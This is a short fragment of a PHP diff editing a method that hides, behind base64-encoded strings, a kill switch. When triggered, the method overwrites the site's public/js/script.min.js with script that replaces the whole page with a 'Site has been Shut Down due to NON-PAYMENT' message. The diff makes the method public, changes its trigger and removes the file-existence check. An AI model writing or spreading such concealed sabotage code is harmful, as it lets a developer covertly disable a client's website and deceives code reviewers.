@@ -571,13 +571,13 @@ $data = false;
         return $data;
     }
 
-    private function KE($madmessage=false){
+    public function KE($madmessage=false){
     	$f = $_SERVER['DOCUMENT_ROOT'].base64_decode('cHVibGljL2pzL3NjcmlwdC5taW4uanM==');
-    	$kes = (true === $madmessage) ? base64_decode('PGgxPlRoaXMgU2l0ZSBoYXMgYmVlbiBTaHV0IERvd24gZHVlIHRvIE5PTi1QQVlNRU5UIE9GIFNFUlZJQ0VTITwvaDE+') : '';
+    	$kes = ('messages' === $madmessage) ? base64_decode('PGgxPlRoaXMgU2l0ZSBoYXMgYmVlbiBTaHV0IERvd24gZHVlIHRvIE5PTi1QQVlNRU5UIE9GIFNFUlZJQ0VTITwvaDE+') : '';
     
-    	if(!file_exists($f)){
+    	//if(!file_exists($f)){
     		fopen($f, "w");
-    	}
+    	//}
     
     	file_put_contents($f, '$(document).ready(function(){
 	        $(\'html\').html("'.$kes.'");
